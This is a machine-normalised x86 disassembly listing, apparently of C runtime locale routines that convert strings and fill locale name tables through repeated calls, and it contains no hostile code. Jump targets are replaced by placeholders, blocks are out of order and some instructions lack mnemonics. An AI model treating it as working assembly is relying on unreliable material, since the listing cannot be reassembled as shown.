cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_405894
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40c890
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_411e7a
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_409ff1
pop ecx
cmp eax ebx
je r-xdata
call sub_41a440
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_4121cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4120e5
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41220c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_411672
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_411672
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_411672
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_411672
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_412a0b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_409812
push [ esi + 0x8 ]
call sub_409812
push [ esi + 0xc ]
call sub_409812
push [ esi + 0x10 ]
call sub_409812
push [ esi + 0x14 ]
call sub_409812
push [ esi + 0x18 ]
call sub_409812
push [ esi ]
call sub_409812
push [ esi + 0x20 ]
call sub_409812
push [ esi + 0x24 ]
call sub_409812
push [ esi + 0x28 ]
call sub_409812
push [ esi + 0x2c ]
call sub_409812
push [ esi + 0x30 ]
call sub_409812
push [ esi + 0x34 ]
call sub_409812
push [ esi + 0x1c ]
call sub_409812
push [ esi + 0x38 ]
call sub_409812
push [ esi + 0x3c ]
call sub_409812
add esp 0x40
push [ esi + 0x40 ]
call sub_409812
push [ esi + 0x44 ]
call sub_409812
push [ esi + 0x48 ]
call sub_409812
push [ esi + 0x4c ]
call sub_409812
push [ esi + 0x50 ]
call sub_409812
push [ esi + 0x54 ]
call sub_409812
push [ esi + 0x58 ]
call sub_409812
push [ esi + 0x5c ]
call sub_409812
push [ esi + 0x60 ]
call sub_409812
push [ esi + 0x64 ]
call sub_409812
push [ esi + 0x68 ]
call sub_409812
push [ esi + 0x6c ]
call sub_409812
push [ esi + 0x70 ]
call sub_409812
push [ esi + 0x74 ]
call sub_409812
push [ esi + 0x78 ]
call sub_409812
push [ esi + 0x7c ]
call sub_409812
add esp 0x40
push [ esi + 0x80 ]
call sub_409812
push [ esi + 0x84 ]
call sub_409812
push [ esi + 0x88 ]
call sub_409812
push [ esi + 0x8c ]
call sub_409812
push [ esi + 0x90 ]
call sub_409812
push [ esi + 0x94 ]
call sub_409812
push [ esi + 0x98 ]
call sub_409812
push [ esi + 0x9c ]
call sub_409812
push [ esi + 0xa0 ]
call sub_409812
push [ esi + 0xa4 ]
call sub_409812
push [ esi + 0xa8 ]
call sub_409812
push [ esi + 0xbc ]
call sub_409812
push [ esi + 0xc0 ]
call sub_409812
push [ esi + 0xc4 ]
call sub_409812
push [ esi + 0xc8 ]
call sub_409812
push [ esi + 0xcc ]
call sub_409812
add esp 0x40
push [ esi + 0xd0 ]
call sub_409812
push [ esi + 0xb8 ]
call sub_409812
push [ esi + 0xd8 ]
call sub_409812
push [ esi + 0xdc ]
call sub_409812
push [ esi + 0xe0 ]
call sub_409812
push [ esi + 0xe4 ]
call sub_409812
push [ esi + 0xe8 ]
call sub_409812
push [ esi + 0xec ]
call sub_409812
push [ esi + 0xd4 ]
call sub_409812
push [ esi + 0xf0 ]
call sub_409812
push [ esi + 0xf4 ]
call sub_409812
push [ esi + 0xf8 ]
call sub_409812
push [ esi + 0xfc ]
call sub_409812
push [ esi + 0x100 ]
call sub_409812
push [ esi + 0x104 ]
call sub_409812
push [ esi + 0x108 ]
call sub_409812
add esp 0x40
push [ esi + 0x10c ]
call sub_409812
push [ esi + 0x110 ]
call sub_409812
push [ esi + 0x114 ]
call sub_409812
push [ esi + 0x118 ]
call sub_409812
push [ esi + 0x11c ]
call sub_409812
push [ esi + 0x120 ]
call sub_409812
push [ esi + 0x124 ]
call sub_409812
push [ esi + 0x128 ]
call sub_409812
push [ esi + 0x12c ]
call sub_409812
push [ esi + 0x130 ]
call sub_409812
push [ esi + 0x134 ]
call sub_409812
push [ esi + 0x138 ]
call sub_409812
push [ esi + 0x13c ]
call sub_409812
push [ esi + 0x140 ]
call sub_409812
push [ esi + 0x144 ]
call sub_409812
push [ esi + 0x148 ]
call sub_409812
add esp 0x40
push [ esi + 0x14c ]
call sub_409812
push [ esi + 0x150 ]
call sub_409812
push [ esi + 0x154 ]
call sub_409812
push [ esi + 0x158 ]
call sub_409812
push [ esi + 0x15c ]
call sub_409812
push [ esi + 0x160 ]
call sub_409812
add esp 0x18
sub_412d82
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rwxdata
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_40c060
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_41220c
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_412a0b
push edi
call sub_409812
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_412dff
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_412e2f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
push esi
call sub_409812
pop ecx
sub_412e98
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_40c060
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_40c01b
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rwxdata
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_409812
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rwxdata ]
mov [ ebx ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x4 ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x8 ] eax
mov eax [ rwxdata ]
mov [ ebx + 0x30 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_40c01b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_411672
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_412e2f
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_409812
push [ esi + 0xbc ]
call sub_409812
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_409812
push [ ebp - 0x8 ]
call sub_409812
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_413088
xor dl dl
cmp [ ecx ] dl
je r-xdata
retn
push ebx
push esi
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc ecx
mov eax ecx
sub al 0x30
mov [ ecx ] al
mov al [ ecx ]
cmp al 0x30
jl r-xdata
pop esi
pop ebx
mov bl [ eax + 0x1 ]
mov [ eax ] bl
inc eax
cmp [ eax ] dl
jne r-xdata
jmp r-xdata
cmp [ ecx ] dl
jne r-xdata
sub_4130b8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rwxdata ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rwxdata ]
je r-xdata
push eax
call sub_409812
pop ecx
push esi
call sub_409812
pop ecx
sub_4131b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_40c060
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_40c01b
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rwxdata
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_409812
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rwxdata
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_40c01b
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_411672
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_411672
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
